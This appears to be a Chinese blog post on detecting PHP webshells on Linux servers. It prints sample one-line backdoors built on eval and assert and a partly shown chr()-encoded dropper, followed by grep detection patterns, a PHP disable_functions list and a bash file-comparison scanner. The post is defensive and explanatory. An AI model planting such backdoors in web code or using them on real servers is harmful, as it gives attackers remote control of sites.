首先认识一下小马，一般大马容易暴露，骇客都会留一手，把小马加入正常PHP文件里面
<?php eval ($_POST[a]);?> //密码为a,使用中国菜刀连接
隐藏很深的小马
fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).
。。。省略
解码：
其中chr括号里面的数字是美国信息交换标准代码,缩写：ASCII 可以找一份对照表对应一下
比如 46  就是 .
       47  就是 /
       32  就是 空格

也可以echo chr(46)解出来
<?php
echo chr(46).chr(47).chr(97).chr(46)
?>

WINDOWS下的应该有很多日志分析和查杀工具（比如D盾等），那么，LINUX下如何查找WEBSHELL呢？

find /www/ -name "*.php" |xargs egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode'
然后就手工查看，写入计划任务啦。
只查小马的可以
grep -r --include=*.php  '[^a-z]eval($_POST' . > post.txt
grep -r --include=*.php  '[^a-z]eval($_REQUEST' . > REQUEST.txt
查出来了，重要的是要分析日志，查看入侵源头。
防范：
禁用危险函数，整理权限，防止权限过大
disable_functions = exec,scandir,shell_exec,phpinfo,eval,passthru,system,chroot,chgrp,chown,proc_open,proc_get_status,ini_alter,ini_restore,dl,openlog,syslog,readlink,s
ymlink,popepassthru,stream_socket_server,fsocket
在网上找了一份用PHP查找WEBSHELL的东东，适用数据量小及少
https://github.com/emposha/PHP-Shell-Detector
git 下来  只需要2个文件
shelldetect.php   //默认帐号密码 admin protect 
shelldetect.db
如果你有什么好的建议，感谢你的分享：）
20130826更新
小马的变种很多，经常会绕过我们的检查，此时，最好能做把文件进行对比。
比如，网上找的这个PHP一句话<?php $k="ass"."ert";$k(${"_PO"."ST"}['8']);?>
下面提供自己写的比较简单的检查脚本，思路是对比目录有更新的PHP文件进行匹配。

#!/bin/bash
# 先RSYNC干净的，再执行此脚本最好
Date=`date +%Y%m%d_%H:%M`
src=/www/www.a.com/
dest=/www/www.a.com.bk/
log_tmp1=/root/sh/webshell_php.log
log_result=/root/sh/webshell_result.log
which egrep
if [ $? -ne 0 ];then
echo "Not Found egrep,exit"
exit 0
fi
rsync -av --include="*/" --include="*.php" --exclude="*" $src $dest|grep -i php > $log_tmp1
for diff in `cat $log_tmp1`
  do
     egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode|\@preg_replace' "$dest""$diff"
  if [ $? -eq 0 ];then
     echo "===========================" >> $log_result
     echo "$Date" >> $log_result
     echo "$dest$diff is Dangerous" >> $log_result
   fi
done

